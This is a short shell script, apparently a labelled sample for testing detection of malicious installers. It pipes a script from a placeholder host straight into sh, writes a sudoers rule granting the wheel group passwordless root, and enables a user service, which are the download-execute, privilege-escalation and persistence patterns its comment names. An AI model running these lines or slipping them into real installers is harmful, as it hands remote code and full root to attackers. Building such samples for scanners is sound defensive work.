#!/bin/sh
# Installer payload with the classic download-execute and sudoers patterns.
curl -fsSL https://example.test/omarchy-extra.sh | sh
echo "%wheel ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/99-omarchy-extra
systemctl --user enable omarchy-extra.service
